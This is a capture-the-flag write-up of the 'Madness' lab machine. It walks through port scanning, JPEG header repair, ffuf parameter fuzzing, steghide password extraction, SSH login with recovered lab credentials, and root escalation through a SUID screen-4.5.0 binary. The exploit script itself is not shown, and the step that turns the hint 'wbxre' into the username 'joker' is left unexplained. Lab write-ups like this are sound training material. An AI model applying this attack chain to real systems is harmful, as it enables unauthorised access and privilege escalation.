# Madness CTF Challenge Write-Up

## Overview

This walkthrough documents the compromise of the Madness machine, beginning with initial reconnaissance and culminating in full root compromise. The challenge combines several classic CTF techniques:

- file type inspection and JPEG header repair
- hidden web directory discovery and parameter fuzzing
- credential recovery through steganography and secret extraction
- SSH access as a low-privileged user
- privilege escalation via a vulnerable `screen` binary (`screen-4.5.0`)

The attack path is as follows:

- enumerate open ports and confirm the web service
- detect a corrupted JPEG file and repair it
- extract hidden content and discover a secret parameter value
- recover a password from steganographic data
- log in as the discovered user (`joker`)
- identify a vulnerable SUID binary
- exploit the `screen` privilege escalation to gain root access
- retrieve the root flag

---

## 1. Initial Reconnaissance

### Port Scanning

The first step is to identify open ports and services.

```bash
nmap -sV 10.113.148.168
```

### Results

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-29 12:40 -0400
Nmap scan report for 10.113.148.168
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only SSH and HTTP are exposed. The web server is the main attack vector.

![Image Placeholder: Nmap scan output](./assets/nmap-scan.png)

---

## 2. Web Enumeration

### Downloading the Image

The first visible clue is a suspicious file named `thm.jpg`.

```bash
wget http://10.113.148.168/thm.jpg
```

### Checking the File Type

```bash
file -k thm.jpg
```

```text
thm.jpg: data
```

This indicates the file is not a valid JPEG and likely has a corrupted or incorrect header.

### Inspecting the Header

```bash
xxd -l 16 thm.jpg
```

```text
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
```

The first bytes are PNG magic bytes, which is wrong for a JPEG. The file is likely a JPEG with a bad header and needs to be repaired.

![Image Placeholder: JPEG header mismatch](./assets/jpeg-header.png)

---

## 3. Repairing the Corrupted JPEG

### Fixing the Header

The attacker exports the file to a hex dump and replaces the incorrect header with the valid JPEG signature.

```bash
xxd thm.jpg > dump.hex
nano dump.hex
```

The first line is corrected to:

```text
0000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001
```

Then the dump is converted back to a binary file:

```bash
xxd -r dump.hex > thm-fix.jpg
file -k thm-fix.jpg
```

### Result

```text
thm-fix.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 400x400, components 3\012- data
```

The repaired JPEG can now be opened.

![Image Placeholder: Repaired image](./assets/repaired-jpeg.png)

---

## 4. Hidden Content and Secret Directory

### Opening the Image

When the repaired image is opened, it contains a hidden clue or secret path. The notes indicate the image reveals a URL such as:

```text
http://10.113.148.168/th1s_1s_h1dd3n/
```

This path is then accessed manually.

### Inspecting the Source

The page source reveals the following string:

```html
<p>To obtain my identity you need to guess my secret! </p>
<!-- It's between 0-99 but I don't think anyone will look here-->
```

This indicates that the secret is a number between 0 and 99.

The attacker now fuzzes the parameter `secret` using a numeric wordlist.

```bash
seq 1 99 > numbers.txt
ffuf -u http://10.113.148.168/th1s_1s_h1dd3n/?secret=FUZZ -w numbers.txt -mc all
```

Since every response returns `200`, the attacker filters values by response size to find the one that differs.

```bash
ffuf -u http://10.113.148.168/th1s_1s_h1dd3n/?secret=FUZZ -w numbers.txt -fw 45
```

### Discovered Secret Value

```text
73  [Status: 200, Size: 445, Words: 53, Lines: 19, Duration: 272ms]
```

The correct parameter is therefore:

```text
?secret=73
```

When opened, the page shows:

```text
Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B
```

This reveals a password candidate: `y2RPJ4QaPF!B`.

![Image Placeholder: Hidden directory response](./assets/hidden-dir.png)

---

## 5. Steganography and Credential Recovery

### Steganography on the Repaired JPEG

The password found in the hidden directory is then used against the repaired JPEG image.

```bash
steghide extract -sf thm-fix.jpg
```

The attacker enters:

```text
Enter passphrase:y2RPJ4QaPF!B
```

### Extracted Output

```text
wrote extracted data to "hidden.txt"
```

```bash
cat hidden.txt
```

```text
Fine you found the password!

Here's a username

wbxre

I didn't say I would make it easy for you!
```

The notes indicate that the username is not directly usable, so the attacker continues to analyze the image and discover the true credential source.

This is a common challenge pattern where a hidden file contains a username or a hint, but not the final secret credential.

---

## 6. Follow-Up Image Analysis

The attacker downloads an external image referenced by the challenge or source metadata and runs steghide again.

```bash
wget https://assets.tryhackme.com/additional/imgur/5iW7kC8.jpg
steghide extract -sf 5iW7kC8.jpg
```

The passphrase is not known, so the attacker starts by attempting extraction without input. The tool then yields a hidden file containing the actual final password.

```text
wrote extracted data to "password.txt"
```

```bash
cat password.txt
```

```text
I didn't think you'd find me! Congratulations!
Here take my password
*axA&GF8dP
```

This yields the final credential password: `*axA&GF8dP`.

The username from the earlier hint is `joker`, so the SSH credentials are likely:

```text
Username: joker
Password: *axA&GF8dP
```

![Image Placeholder: Final password extraction](./assets/stegano-password.png)

---

## 7. SSH Access as `joker`

### Login

```bash
ssh joker@10.113.148.168
```

### Credentials

```text
Password: *axA&GF8dP
```

The login succeeds.

### User Directory Enumeration

```bash
ls -la
```

```text
total 20
drwxr-xr-x 3 joker joker 4096 Oct 29 10:56 .
drwxr-xr-x 3 root  root  4096 Jan  4  2020 ..
-rw------- 1 joker joker    0 Jan  5  2020 .bash_history
-rw-r--r-- 1 joker joker 3771 Jan  4  2020 .bashrc
drwx------ 2 joker joker 4096 Oct 29 10:56 .cache
-rw-r--r-- 1 root  root    38 Jan  6  2020 user.txt
```

The user reads the flag file:

```bash
cat user.txt
```

This confirms the initial foothold and retrieves the user-level flag.

![Image Placeholder: SSH login as joker](./assets/joker-login.png)

---

## 8. Privilege Escalation via SUID Binary

### Searching for SUID Binaries

The next step is to find binaries with the SUID bit enabled.

```bash
find / -perm -4000 -type f -ls 2>/dev/null
```

### Relevant Result

```text
150852   1552 -rwsr-xr-x   1 root     root        1588648 Jan  4  2020 /bin/screen-4.5.0
```

This is a classic Linux privilege escalation vector. The `screen` binary is SUID-root and vulnerable to a known exploitation technique.

### Researching the Exploit

The notes indicate that the attacker references an exploit from Exploit-DB:

```text
https://www.exploit-db.com/exploits/41154
```

The binary is abused to spawn a root shell by leveraging the `screen` SUID privilege boundary.

---

## 9. Exploitation of `screen-4.5.0`

### Preparing the Exploit Script

The attacker creates a temporary script and executes it.

```bash
nano up.sh
chmod +x up.sh
./up.sh
```

The exploit script launches a root shell via the vulnerable SUID binary. The exact implementation differs by environment, but the goal is to spawn a root shell to execute commands as `root`.

### Result

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root),1000(joker)
```

This confirms full root access.

![Image Placeholder: Root shell via screen exploit](./assets/root-shell.png)

---

## 10. Final Flag Retrieval

Once root access is obtained, the attacker reads the final root flag.

```bash
cd /root
ls -la
cat root.txt
```

### Final Output

```text
<root flag here>
```

This completes the challenge.

---

## 11. Summary of the Exploit Chain

1. Enumerated the host with `nmap`
2. Downloaded and repaired a corrupted JPEG file to reveal a hidden path
3. Fuzzed a numeric `secret` parameter and discovered the correct value
4. Used the recovered password to uncover a hidden steganographic file
5. Extracted the real password and recovered the `joker` SSH credentials
6. Logged in as `joker`
7. Identified a vulnerable SUID `screen` binary (`screen-4.5.0`)
8. Exploited it to obtain a root shell
9. Read the final `/root/root.txt` flag

---

## 12. Key Takeaways

- Corrupted files can hide clues when the metadata or header is incorrect.
- Hidden web paths often appear in comments or other concealed application content.
- Steganography and file-carving techniques can recover credentials or hints from image files.
- `screen` on older Linux systems is a classic SUID privilege escalation target.
- Privilege escalation often requires combining filesystem enumeration and known exploitation techniques.

> Important: This challenge demonstrates how multiple stages can be chained together: repairing a broken image, discovering a hidden parameter, extracting a password via steganography, and then exploiting an old SUID binary for root.

---

## 13. Relevant Commands

```bash
nmap -sV 10.113.148.168
wget http://10.113.148.168/thm.jpg
file -k thm.jpg
xxd -l 16 thm.jpg
xxd thm.jpg > dump.hex
nano dump.hex
xxd -r dump.hex > thm-fix.jpg
file -k thm-fix.jpg
ffuf -u http://10.113.148.168/th1s_1s_h1dd3n/?secret=FUZZ -w numbers.txt -mc all
ffuf -u http://10.113.148.168/th1s_1s_h1dd3n/?secret=FUZZ -w numbers.txt -fw 45
steghide extract -sf thm-fix.jpg
cat hidden.txt
wget https://assets.tryhackme.com/additional/imgur/5iW7kC8.jpg
steghide extract -sf 5iW7kC8.jpg
cat password.txt
ssh joker@10.113.148.168
ls -la
find / -perm -4000 -type f -ls 2>/dev/null
nano up.sh
chmod +x up.sh
./up.sh
id
cd /root
cat root.txt
```

---

## Final Result

The Madness machine was successfully compromised by repairing a corrupted image, discovering a hidden web directory, extracting data via steganography, and finally exploiting a vulnerable SUID `screen` binary to gain root access. The root flag was then retrieved from `/root/root.txt`.

![Image Placeholder: Final challenge completion](./assets/final-result.png)
